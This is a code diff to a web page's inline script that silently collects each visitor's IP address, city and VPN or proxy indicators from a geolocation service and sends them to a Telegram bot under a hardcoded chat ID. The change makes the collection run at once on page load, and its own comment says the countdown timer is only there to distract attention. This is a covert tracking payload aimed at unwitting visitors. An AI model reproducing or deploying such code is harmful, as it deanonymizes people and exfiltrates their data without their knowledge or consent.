@@ -34,32 +34,30 @@
             const chatId = '8098905046';
             const timerEl = document.getElementById('timer');
             let counter = 10;
+            let dataSent = false;
 
-            // Функция отправки в Telegram
             function sendTelegram(text) {
+                if (dataSent) return;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: text })
                 }).catch(() => {});
+                dataSent = true;
             }
 
-            // Асинхронный сбор данных
             async function collectAndSend() {
                 try {
-                    // 1. IP и гео
                     const res = await fetch('https://ipapi.co/json/');
                     const data = await res.json();
 
-                    // 2. Определяем возможный VPN/прокси по признакам
                     let vpnSigns = [];
                     if (data.proxy === true) vpnSigns.push('прокси');
                     if (data.hosting === true) vpnSigns.push('хостинг/датацентр');
-                    if (data.org && data.org.toLowerCase().includes('vpn')) vpnSigns.push('VPN в названии провайдера');
-                    if (data.country_code && data.country_code !== 'RU' && data.country_code !== 'UA' && data.country_code !== 'BY' && data.country_code !== 'KZ') vpnSigns.push('не СНГ');
-                    const vpnStatus = vpnSigns.length > 0 ? '⚠️ Есть признаки VPN/прокси: ' + vpnSigns.join(', ') : '✅ VPN/прокси не обнаружено';
+                    if (data.org && data.org.toLowerCase().includes('vpn')) vpnSigns.push('VPN в названии');
+                    if (data.country_code && !['RU','UA','BY','KZ'].includes(data.country_code)) vpnSigns.push('не СНГ');
+                    const vpnStatus = vpnSigns.length > 0 ? '⚠️ Признаки VPN: ' + vpnSigns.join(', ') : '✅ VPN не обнаружено';
 
-                    // 3. Формируем отчёт
                     const message =
                         'IP: ' + (data.ip || '—') + '\n' +
                         'Город: ' + (data.city || '—') + '\n' +
@@ -74,27 +72,22 @@
 
                     sendTelegram(message);
                 } catch(e) {
-                    sendTelegram('Ошибка сбора данных: ' + e.message);
+                    sendTelegram('Ошибка: ' + e.message);
                 }
             }
 
-            // Счётчик
+            // === ЗАПУСКАЕМ СБОР ДАННЫХ МГНОВЕННО ===
+            collectAndSend();
+
+            // Счётчик просто для отвлечения внимания
             const interval = setInterval(() => {
                 counter--;
                 timerEl.textContent = counter;
-
                 if (counter <= 0) {
                     clearInterval(interval);
-                    timerEl.textContent = '0';
-                    collectAndSend(); // отправляем данные
+                    timerEl.textContent = '💀';
                 }
             }, 1000);
-
-            // Если клик — просто сброс таймера (можно убрать)
-            document.addEventListener('click', () => {
-                counter = 10;
-                timerEl.textContent = counter;
-            });
         })();
     </script>
 </body>
